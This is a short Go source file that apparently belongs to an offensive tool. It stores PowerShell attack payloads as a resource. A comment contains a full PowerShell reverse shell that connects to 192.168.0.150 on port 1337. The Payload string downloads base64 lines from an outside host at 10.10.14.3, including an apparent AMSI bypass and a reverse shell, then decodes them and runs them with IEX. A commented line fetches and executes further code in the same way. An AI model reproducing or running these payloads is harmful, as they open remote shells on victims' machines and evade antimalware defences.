package resources

// Payload is the powershell payload
//  $client = New-Object System.Net.Sockets.TCPClient("192.168.0.150",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
var Payload string = `
ForEach ($line in $((New-Object Net.WebClient).DownloadString('http://10.10.14.3:6698/b64/ambyp') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
cacaprout
ForEach ($line in $((New-Object Net.WebClient).DownloadString('http://10.10.14.3:6698/b64/rsh') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
`

// $((New-Object Net.WebClient).DownloadString('http://192.168.0.150:5555/aaaa')) | IEX
